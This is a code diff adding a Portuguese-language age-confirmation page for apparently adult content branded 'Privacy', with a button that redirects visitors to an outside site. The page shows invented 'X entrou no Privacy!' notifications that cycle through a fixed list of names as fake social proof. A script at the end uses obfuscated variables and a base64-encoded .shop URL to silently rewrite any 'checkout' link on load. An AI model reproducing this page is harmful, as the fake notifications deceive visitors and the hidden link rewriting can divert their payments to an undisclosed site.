@@ -1,0 +1,193 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmar Idade</title>
+    <style>
+      /* Reset básico e estilos globais */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Arial", sans-serif;
+        background-color: #000000; /* Substitua 'sua-imagem.jpg' pelo caminho da sua imagem */
+        background-size: cover; /* Faz a imagem cobrir todo o fundo */
+        background-position: center; /* Centraliza a imagem */
+        background-repeat: no-repeat; /* Evita que a imagem se repita */
+        color: #f9f9f9;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+
+      .notification {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background-color: #faf9f7;
+        color: #ff9d00;
+        padding: 10px 20px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: bold;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        animation: slideUp 4s ease-in-out infinite;
+        opacity: 0;
+      }
+
+      @keyframes slideUp {
+        0% {
+          transform: translateY(20px);
+          opacity: 0;
+        }
+        20%,
+        80% {
+          transform: translateY(0);
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(-20px);
+          opacity: 0;
+        }
+      }
+
+      .container {
+        background-color: #ffffff; /* Fundo branco do quadrado */
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        padding: 20px;
+        border-radius: 12px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      }
+
+      .logo {
+        max-width: 120px;
+        margin: 0 auto 20px;
+        border-radius: 50%;
+        display: block;
+      }
+
+      .title {
+        font-size: 22px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        color: #333; /* Texto mais escuro para contraste no fundo branco */
+      }
+
+      .subtitle {
+        color: #555;
+        margin-bottom: 20px;
+        line-height: 1.5;
+      }
+
+      .button {
+        display: inline-block;
+        width: 100%;
+        padding: 15px 20px;
+        font-size: 18px;
+        font-weight: bold;
+        color: #fff;
+        text-decoration: none;
+        background-color: #ff9d00; /* Azul do botão */
+        border: none;
+        border-radius: 8px;
+        margin-bottom: 15px;
+        transition: background-color 0.3s, transform 0.2s;
+      }
+
+      .button:hover {
+        background-color: #37be06a4; /* Azul mais escuro no hover */
+        transform: scale(1.05);
+      }
+
+      .button:active {
+        transform: scale(1);
+      }
+
+      @media (max-width: 480px) {
+        .title {
+          font-size: 20px;
+        }
+        .button {
+          font-size: 16px;
+        }
+      }
+    </style>
+    <script>
+      // Lista de 15 nomes masculinos
+      const nomes = [
+        "Bernado",
+        "Pedro",
+        "Gabriel",
+        "Matheus",
+        "Rafael",
+        "João",
+        "Guilherme",
+        "Henrique",
+        "Felipe",
+        "Hugo",
+        "Victor",
+        "Bruno",
+        "Leonardo",
+        "Tiago",
+        "Luan",
+      ];
+
+      // Variável de índice para exibir os nomes em sequência
+      let indiceAtual = 0;
+
+      // Função para atualizar o nome exibido
+      function atualizarNome() {
+        const notification = document.getElementById("notification");
+        notification.textContent = `${nomes[indiceAtual]} entrou no Privacy!🔥`;
+        indiceAtual = (indiceAtual + 1) % nomes.length; // Volta ao início após o último nome
+      }
+
+      // Inicia o loop para mudar o nome a cada 4 segundos
+      setInterval(atualizarNome, 4000);
+    </script>
+  </head>
+  <body>
+    <!-- Notificação no canto inferior direito -->
+    <div id="notification" class="notification"></div>
+
+    <div class="container">
+      <!-- Logo no topo -->
+      <img src="images/tGSUSMt.jpg" alt="Logo" class="logo">
+      <!-- Título -->
+      <p class="title">Confirmação de Idade</p>
+
+      <!-- Texto explicativo -->
+      <p class="subtitle">
+        Este conteúdo é destinado exclusivamente para maiores de 18 anos. Por
+        favor, confirme sua idade para continuar.
+      </p>
+
+      <!-- Botões -->
+      <button class="button" onclick="window.location.href='https://privacyhaellentays.netlify.app/' + (window.location.search )">
+        Tenho mais de 18 anos
+      </button>
+    </div>
+
+    <script>
+      (function () {
+        var _0x1 = [
+          "aHR0cHM6Ly9jb250ZXVkb2thbWlsaW5oYTAzLnNob3AvPzE3MzUwNzQyMTMmZmJjbGlkPWZiY2xpZA==",
+        ];
+        function _0x2() {
+          var _0x3 = document.querySelector('a[href*="checkout"]');
+          if (_0x3) {
+            _0x3.href = atob(_0x1[0]);
+          }
+        }
+        window.onload = _0x2;
+      })();
+    </script>
+  
+
+</body></html>
